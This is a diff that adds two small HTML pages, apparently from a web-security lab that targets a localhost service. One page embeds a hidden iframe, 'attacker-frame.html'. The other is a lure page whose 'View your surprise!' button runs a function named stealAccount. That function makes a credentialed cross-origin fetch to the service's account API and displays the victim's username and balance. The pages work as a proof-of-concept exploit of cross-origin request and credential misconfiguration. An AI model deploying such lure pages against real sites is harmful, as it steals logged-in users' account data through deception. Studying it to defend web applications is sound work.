@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cool Cat Site</title>
+</head>
+<body>
+    <h1>Cool cat site</h1>
+    <iframe src='attacker-frame.html' style='display: none'></iframe>
+</body>
+<script>
+  document.querySelector('iframe').addEventListener('load', function () {
+      console.log('iframe loaded');
+  });
+</script>
+</html>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cool Cat Site</title>
+</head>
+<body>
+    <h1>Cool Cat Site</h1>
+    <img src='cat.gif' />
+
+    <button onclick="stealAccount()">View your surprise!</button>
+
+    <pre id="result"></pre>
+
+    <script>
+    function stealAccount() {
+        fetch('http://localhost:4000/api/account', {
+            credentials: 'include'
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Request failed: ' + response.status);
+            }
+            return response.json();
+        })
+        .then(data => {
+            document.getElementById('result').textContent =
+                'Account information obtained!\n' +
+                'Username: ' + data.username + '\n' +
+                'Balance: $' + data.balance;
+        })
+        .catch(error => {
+            document.getElementById('result').textContent =
+                'Could not obtain account information: ' + error;
+        });
+    }
+    </script>
+</body>
+</html>
